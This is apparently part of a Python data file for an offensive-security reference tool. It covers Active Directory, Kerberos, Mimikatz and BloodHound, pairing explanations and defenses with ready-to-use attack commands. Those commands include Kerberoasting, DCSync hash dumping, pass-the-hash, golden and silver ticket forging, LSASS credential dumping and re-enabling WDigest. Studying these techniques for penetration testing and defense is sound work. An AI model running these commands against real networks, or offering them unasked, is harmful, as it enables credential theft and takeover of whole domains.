
  # ════════════════════════════════════════════════════════
  # MASTERY BLOCK 1 — ACTIVE DIRECTORY & KERBEROS
  # ════════════════════════════════════════════════════════

  "active directory": {
    "title": "Active Directory (AD) — The Target of Every Enterprise Engagement",
    "tldr": "Microsoft's directory service managing users, computers, and policies across Windows networks. Compromising it = owning the entire org.",
    "what": (
      "Active Directory (AD) is the identity backbone of virtually every enterprise Windows network. "
      "It manages authentication (Kerberos/NTLM), authorization (group membership), group policies, "
      "DNS, and certificate services. The Domain Controller (DC) is the crown jewel — if you own it, "
      "you own every machine in the domain."
    ),
    "how": (
      "AD attack chain — standard enterprise compromise:\n"
      "  1. Gain initial foothold (phishing, vuln exploit, VPN brute)\n"
      "  2. Enumerate domain: users, groups, computers, trusts\n"
      "  3. Find kerberoastable service accounts → crack offline\n"
      "  4. Lateral movement via PtH / PtT to reach privileged hosts\n"
      "  5. Dump NTDS.dit or DCSync → all domain hashes\n"
      "  6. Golden Ticket → unlimited domain persistence"
    ),
    "commands": {
      "Enumerate domain (Bloodhound)":  "bloodhound-python -u user -p pass -d domain.local -c All",
      "Domain info (CME)":              "crackmapexec smb DC_IP -u user -p pass --users --groups",
      "Domain info (Impacket)":         "python3 GetADUsers.py domain/user:pass -all",
      "Find DAs":                       "net group 'Domain Admins' /domain",
      "Kerberoasting":                  "python3 GetUserSPNs.py domain/user:pass -request -outputfile spns.txt",
      "AS-REP Roasting":                "python3 GetNPUsers.py domain/ -usersfile users.txt -no-pass",
      "DCSync (all hashes)":            "python3 secretsdump.py domain/user:pass@DC_IP",
      "Pass-the-Hash":                  "crackmapexec smb 192.168.1.0/24 -u admin -H NTLM_HASH",
      "Evil-WinRM":                     "evil-winrm -i DC_IP -u administrator -H HASH",
    },
    "tools": {
      "BloodHound":   "Graph-based AD attack path visualizer — shows shortest path to DA",
      "SharpHound":   "BloodHound data collector (runs on target)",
      "Impacket":     "Python toolkit for AD exploitation (secretsdump, psexec, etc.)",
      "CrackMapExec": "Swiss army knife for AD enumeration and lateral movement",
      "Rubeus":       "Windows Kerberos manipulation tool (Kerberoast, PtT, AS-REP)",
      "Evil-WinRM":   "WinRM shell with PtH and Kerberos support",
      "Mimikatz":     "Windows credential extraction (see mimikatz lesson)",
    },
    "defense": "Tiered admin model, Privileged Access Workstations (PAWs), Protected Users group, Credential Guard, LAPS, disable NTLM where possible, monitor 4769/4624/4625",
    "tips": [
      "Run BloodHound first — it maps the ENTIRE attack path visually",
      "Every domain user can Kerberoast — it requires zero privileges",
      "DCSync requires DA privs but dumps every hash in the entire domain",
      "Protected Users group disables NTLM, DES, RC4, unconstrained delegation",
    ],
  },

  "kerberos": {
    "title": "Kerberos — Windows Domain Authentication Protocol",
    "tldr": "The authentication protocol behind Active Directory. Understanding it unlocks Kerberoasting, Golden Tickets, Silver Tickets, and Pass-the-Ticket.",
    "what": (
      "Kerberos is the default authentication protocol in Active Directory. It uses tickets "
      "instead of passwords for authentication. The Key Distribution Center (KDC) on the Domain "
      "Controller issues tickets. Knowing how it works lets you forge, steal, or crack these tickets."
    ),
    "how": (
      "Kerberos flow — what actually happens when you log in:\n"
      "  1. AS-REQ: Client asks KDC for a Ticket Granting Ticket (TGT)\n"
      "     Encrypted with the user's password hash\n"
      "  2. AS-REP: KDC returns TGT encrypted with krbtgt account hash\n"
      "  3. TGS-REQ: Client presents TGT, requests service ticket for a resource\n"
      "  4. TGS-REP: KDC returns service ticket encrypted with SERVICE account hash\n"
      "  5. AP-REQ: Client presents service ticket to the target service\n\n"
      "Attack points:\n"
      "  AS-REP Roasting: Accounts without pre-auth → grab encrypted TGT, crack offline\n"
      "  Kerberoasting: Any user requests TGS for SPN → crack service account hash offline\n"
      "  Pass-the-Ticket: Steal a valid ticket from memory → use it directly\n"
      "  Golden Ticket: Forge TGT using krbtgt hash → unlimited domain access\n"
      "  Silver Ticket: Forge service ticket using service hash → access specific service"
    ),
    "commands": {
      "Kerberoast (Impacket)":     "GetUserSPNs.py domain/user:pass@DC -request -outputfile kerberoast.txt",
      "AS-REP Roast":              "GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip DC_IP",
      "Crack Kerberoast hash":     "hashcat -m 13100 kerberoast.txt rockyou.txt",
      "Crack AS-REP hash":         "hashcat -m 18200 asrep.txt rockyou.txt",
      "Rubeus Kerberoast":         "Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat",
      "Rubeus AS-REP Roast":       "Rubeus.exe asreproast /format:hashcat",
      "Pass-the-Ticket (Rubeus)":  "Rubeus.exe ptt /ticket:base64_ticket",
      "Golden Ticket (Impacket)":  "ticketer.py -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain DOMAIN admin",
    },
    "defense": "Enforce pre-authentication on ALL accounts, use AES encryption for service accounts (not RC4), set strong 25+ char passwords on service accounts, monitor EventID 4769",
    "tips": [
      "AS-REP Roasting: look for accounts with 'Do not require Kerberos preauthentication' set",
      "Kerberoasting: look for service accounts with SPNs (ServicePrincipalName attribute)",
      "Golden Ticket persists even after password changes — must reset krbtgt hash TWICE",
      "hashcat -m 13100 for Kerberoast (TGS-REP), -m 18200 for AS-REP",
    ],
  },

  "mimikatz": {
    "title": "Mimikatz — Windows Credential Extraction Tool",
    "tldr": "Extracts plaintext passwords, hashes, Kerberos tickets, and certificates from Windows memory. The #1 post-exploitation tool.",
    "what": (
      "Mimikatz is a post-exploitation tool that extracts authentication credentials from Windows "
      "memory. It can dump plaintext passwords from LSASS, extract NTLM hashes, steal Kerberos "
      "tickets, and perform Pass-the-Hash/Pass-the-Ticket attacks. Created by Benjamin Delpy, "
      "it exposed fundamental flaws in WDigest authentication."
    ),
    "how": (
      "How Mimikatz works:\n"
      "  LSASS (Local Security Authority Subsystem Service) stores credentials in memory\n"
      "  Mimikatz reads LSASS memory using SeDebugPrivilege (requires admin)\n"
      "  WDigest: Windows XP-Win7 stored cleartext passwords in memory (can be re-enabled)\n"
      "  NTLM hashes can be passed directly without cracking (Pass-the-Hash)\n"
      "  Kerberos tickets in memory can be extracted and reused (Pass-the-Ticket)\n\n"
      "Modern Windows (8.1+) disabled WDigest by default — but attackers can re-enable it\n"
      "and wait for the next login to capture cleartext creds."
    ),
    "commands": {
      "Run as SYSTEM":          "privilege::debug then token::elevate",
      "Dump all creds":         "sekurlsa::logonpasswords",
      "Dump NTLM hashes":       "sekurlsa::msv",
      "Dump Kerberos tickets":  "sekurlsa::tickets",
      "Export tickets":         "sekurlsa::tickets /export",
      "Pass-the-Hash":          "sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:powershell.exe",
      "DCSync (from MSF)":      "load kiwi → dcsync_ntlm krbtgt",
      "Golden Ticket":          "kerberos::golden /user:admin /domain:DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /id:500",
      "Silver Ticket":          "kerberos::golden /user:admin /domain:DOMAIN /sid:SID /target:SERVER /service:cifs /rc4:SERVICE_HASH",
      "Enable WDigest":         "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1",
    },
    "defense": "Credential Guard (virtualizes LSASS), Protected Users group, disable WDigest, Sysmon EventID 10 (LSASS access), EDR behavioral detection, RunAsPPL for LSASS",
    "tips": [
      "Meterpreter: load kiwi → creds_all runs all mimikatz modules in one command",
      "Credential Guard is the most effective mitigation — virtualizes LSASS in a hypervisor",
      "Even with CG, Mimikatz can still dump non-CG protected accounts",
      "Always check: reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
    ],
  },

  "bloodhound": {
    "title": "BloodHound — Active Directory Attack Path Mapper",
    "tldr": "Graph database visualizing shortest attack paths to Domain Admin. The most important AD recon tool.",
    "what": (
      "BloodHound uses graph theory to map Active Directory relationships and find attack paths "
      "to high-value targets. It ingests AD data (users, groups, computers, ACLs, sessions, trusts) "
      "and visualizes paths like: 'User A → owns Group B → has GenericAll on Computer C → local admin "
      "→ DA user logged in → access DA hash → Domain Admin'. Paths invisible to manual enumeration."
    ),
    "how": (
      "BloodHound workflow:\n"
      "  1. Run SharpHound (collector) on target — dumps AD data as JSON\n"
      "  2. Import JSON into BloodHound Neo4j database\n"
      "  3. Use built-in or custom Cypher queries to find attack paths\n"
      "  4. Visualize: 'Shortest Path to Domain Admin'\n"
      "  5. Execute the path — each edge is an exploitable relationship"
    ),
    "commands": {
      "Collect all data (python)":    "bloodhound-python -u user -p pass -d domain.local -c All -ns DC_IP",
      "Collect (SharpHound .exe)":    "SharpHound.exe -c All --zipfilename output.zip",
      "Start BloodHound + Neo4j":     "sudo neo4j start && bloodhound",
      "Cypher: Find DA paths":        "MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN'})) RETURN p",
      "Cypher: Owned paths to DA":    "MATCH p=shortestPath((n {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN'})) RETURN p",
      "Cypher: Kerberoastable accts": "MATCH (u:User {hasspn:true}) RETURN u.name, u.description",
      "Cypher: AS-REP roastable":     "MATCH (u:User {dontreqpreauth:true}) RETURN u.name",
      "Mark node as owned":           "Right-click node → Mark as Owned (after compromise)",
    },
    "tools": {
      "SharpHound":         "Windows-native .NET collector — runs on domain-joined machine",
      "bloodhound-python":  "Python remote collector — runs from Kali without domain join",
      "AzureHound":         "BloodHound collector for Azure AD / Entra ID",
      "PlumHound":          "Automated BloodHound reporting",
    },
    "defense": "Tiered admin model prevents DA logins on regular workstations, Protected Users group, remove unnecessary ACL edges, monitor SharpHound collection patterns",
    "tips": [
      "Pre-built query 'Shortest Path to Domain Admin' is your starting point every time",
      "Mark every compromised node as 'Owned' — BloodHound shows reachable paths from owned",
      "ACL abuse (GenericAll, WriteDACL, etc.) is almost always in the path — check it",
      "bloodhound-python works remotely from Kali without being on the domain",
    ],
  },

